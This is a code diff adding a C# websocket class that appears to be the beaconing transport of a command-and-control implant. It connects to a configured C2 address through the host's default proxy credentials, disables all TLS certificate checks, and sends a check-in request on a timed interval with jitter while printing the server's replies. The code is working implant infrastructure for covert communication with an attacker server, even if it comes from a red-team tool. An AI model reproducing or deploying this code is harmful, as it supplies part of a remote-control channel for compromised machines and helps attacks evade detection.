@@ -1,0 +1,140 @@
+
+    public class AgentWebsocketSocket
+    {
+        public ClientWebSocket webSocket;
+        private const int receiveChunkSize = 300000;
+        public Configuration configuration;
+
+        public AgentWebsocketSocket(dynamic configuration)
+        {
+            this.configuration = configuration;
+        }
+
+        public string GetURI()
+        {
+            return configuration.C2URI;
+        }
+
+        public void Start()
+        {
+            Console.WriteLine("Connecting to {0}", configuration.C2URI);
+            // create a websocket object
+            webSocket = new ClientWebSocket();
+
+            // get the default proxy if there is
+            webSocket.Options.Proxy = new System.Net.WebProxy();
+
+            // get the credentials for the proxy if there is
+            webSocket.Options.Proxy.Credentials = System.Net.CredentialCache.DefaultCredentials;
+            
+            //ignore certificate issues
+            ServicePointManager.ServerCertificateValidationCallback += (message, cert, chain, sslPolicyErrors) => true;
+
+            try
+            {
+                // connect to the websocket in configuration
+                Console.WriteLine("Linking to the C2 via {0}", configuration.C2URI);
+                webSocket.ConnectAsync(new Uri(configuration.C2URI), CancellationToken.None).Wait();
+                Console.WriteLine("The websocket connection is successfully established.");
+            }
+            catch (Exception e)
+            {
+                Console.WriteLine("Websocket is not available");
+                Console.WriteLine(e);
+                return;
+            }
+            Thread SocketThread = new Thread(() => { StartAsync().Wait(); });
+
+            SocketThread.Start();
+
+            // sleep calculation
+            Int32 i = Int32.Parse(configuration.INTERVAL);
+            Int32 j = Int32.Parse(configuration.JITTER);
+            Int32 SleepTimer = (i - i * j / 100) * 1000;
+
+            while (true)
+            {
+                SendAsync(configuration.REQUEST).Wait();
+                Thread.Sleep(SleepTimer);
+            }
+
+        }
+
+        public bool Send(string data = "")
+        {
+            if (data == "") return false;
+            SendAsync(data).Wait();
+            return true;
+        }
+
+        public async Task StartAsync()
+        {
+            await Task.WhenAll(Receive(), SendAsync());
+        }
+
+        public async Task SendAsync(string data = "")
+        {
+            if (data == "") return;
+
+            try
+            {
+                byte[] buffer = Encoding.UTF8.GetBytes(data);
+                // send the data with buffer header
+                await webSocket.SendAsync(new ArraySegment<byte>(buffer), WebSocketMessageType.Text, true, CancellationToken.None);
+
+            }
+            catch (Exception e)
+            {
+                Console.Error.WriteLine("Socket is unreachable. {0}", e);
+            }
+        }
+
+        public async Task Receive()
+        {
+            try
+            {
+                while (webSocket.State == WebSocketState.Open)
+                {
+                    byte[] rbuffer = new byte[receiveChunkSize];
+                    var result = await webSocket.ReceiveAsync(new ArraySegment<byte>(rbuffer), CancellationToken.None);
+                    string response = Regex.Replace((string)Encoding.UTF8.GetString(rbuffer), "\0", string.Empty);
+                    Console.WriteLine("{0}", response);
+
+
+                    if (result.MessageType == WebSocketMessageType.Close)
+                    {
+                        Console.Error.WriteLine("Socket is closing...");
+                        await StopAsync();
+                    }
+
+                }
+            }
+            catch (Exception e)
+            {
+                Console.Error.WriteLine("The service stopped responding: {0}", e);
+                await StopAsync(true);
+            }
+        }
+
+        public void Stop()
+        {
+            StopAsync().Wait();
+        }
+
+        public async Task StopAsync(bool unreachable = false)
+        {
+            Console.Error.WriteLine("The C2 socket is closing.");
+            if (!unreachable)
+            {
+                try
+                {
+                    await webSocket.CloseOutputAsync(WebSocketCloseStatus.NormalClosure, string.Empty, CancellationToken.None);
+                }
+                catch (Exception e)
+                {
+                    Console.Error.WriteLine("Failed to close the async socket. {0}", e);
+                }
+            }
+
+        }
+    }
